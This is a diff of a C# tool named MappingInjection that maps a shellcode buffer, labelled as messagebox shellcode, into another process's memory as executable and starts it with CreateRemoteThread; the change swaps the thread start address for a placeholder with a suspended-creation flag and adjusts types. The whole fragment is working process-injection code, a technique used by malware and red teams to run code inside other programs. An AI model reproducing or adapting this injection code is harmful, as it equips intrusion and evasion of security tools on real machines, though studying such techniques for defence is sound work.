@@ -14,6 +14,7 @@ namespace MappingInjection
         static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
         static readonly UInt32 NUMA_NO_PREFERRED_NODE = 0xffffffff;
         public static bool MappingInject(int InjectProcess_pid)
+
         {
             /*   Messagebox shellcode   */
             byte[] buf1 = new byte[328] {
@@ -71,22 +72,21 @@ namespace MappingInjection
                 (uint)AllocationProtect.PAGE_EXECUTE_READ,
                 NUMA_NO_PREFERRED_NODE);
 
-            IntPtr RemoteThread_id = IntPtr.Zero;
-            IntPtr RemoteThread_handle = CreateRemoteThread(
-                OpenProcess_handle, 
-                IntPtr.Zero, 
-                0, 
-                MapRemote_address, 
-                IntPtr.Zero, 
-                0, 
+            uint RemoteThread_id = 0;
+            IntPtr Thread_handle = CreateRemoteThread(
+                OpenProcess_handle,
+                IntPtr.Zero,
+                0,
+                (IntPtr)0xfff,
+                IntPtr.Zero,
+                (uint)CreationFlags.CREATE_SUSPENDED,
                 out RemoteThread_id);
 
             Console.WriteLine(RemoteThread_id);
             UnmapViewOfFile(MapViewOfFile_address);
             CloseHandle(OpenProcess_handle);
 
-
-            if (RemoteThread_id != IntPtr.Zero)
+            if (RemoteThread_id != 0)
             {
                  return true;
             }
